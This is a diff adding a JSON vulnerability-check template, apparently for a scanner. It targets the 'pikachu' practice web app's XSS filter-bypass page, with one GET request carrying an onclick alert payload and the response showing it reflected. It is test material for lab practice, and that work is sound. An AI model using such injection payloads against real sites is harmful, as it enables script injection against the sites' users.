@@ -1,0 +1,27 @@
+
+{
+    "name": "pikachu",
+    "vuln": "xss之过滤",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/xss/xss_01.php?message=%3Ca+href%3D%22%22+onclick%3D%22alert%28%27xss%27%29%22%3E&submit=submit",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "<a href=\"\" onclick=\"alert('xss')\">'的话,不要怕,就是干!</p> "
+            }
+        }
+    }
+}
